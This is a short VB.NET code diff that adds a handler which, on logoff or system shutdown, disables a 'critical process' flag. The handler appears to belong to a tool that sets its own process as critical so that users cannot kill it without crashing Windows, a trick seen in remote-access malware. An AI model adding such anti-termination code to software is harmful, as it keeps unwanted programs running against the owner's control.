@@ -65,5 +65,14 @@
             Catch ex As Exception
             End Try
         End Sub
+
+        Sub Handler_SessionEnding(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
+            If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
+                C_CriticalProcesses.CriticalProcesses_Disable()
+            ElseIf e.Reason = Microsoft.Win32.SessionEndReasons.SystemShutdown Then
+                C_CriticalProcesses.CriticalProcesses_Disable()
+            End If
+        End Sub
+
     End Module
 End Namespace
